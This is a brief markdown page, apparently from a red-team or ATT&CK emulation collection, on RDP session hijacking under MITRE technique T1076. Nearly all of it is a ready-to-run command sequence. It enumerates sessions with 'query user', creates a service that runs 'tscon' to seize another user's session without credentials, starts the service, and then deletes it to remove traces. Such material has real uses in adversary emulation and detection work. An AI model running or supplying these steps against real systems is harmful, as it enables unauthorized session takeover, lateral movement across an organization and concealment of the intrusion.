# Remote Desktop Protocol

## MITRE ATT&CK Technique: [T1076](https://attack.mitre.org/wiki/Technique/T1076)


## [RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) how to hijack RDS and RemoteApp sessions transparently to move through an organization

### retrieve the session ID:

    query user

### Set the session ID and rdp-tcp# retrieved from `query user`

    sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"

### Access the session:

    net start sesshijack

### Clean up afterward:

    sc.exe delete sesshijack
